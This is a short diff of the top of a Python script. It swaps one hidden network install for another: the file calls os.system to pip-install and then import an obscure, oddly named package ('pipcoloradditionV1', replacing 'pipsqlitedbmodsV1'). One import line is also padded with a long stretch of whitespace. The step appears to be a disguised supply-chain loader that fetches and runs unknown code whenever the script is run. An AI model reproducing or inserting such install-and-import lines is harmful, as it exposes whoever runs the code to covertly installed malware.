@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlitedbmodsV1")
-import pipsqlitedbmodsV1
+os.system("pip install pipcoloradditionV1")
+import pipcoloradditionV1
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
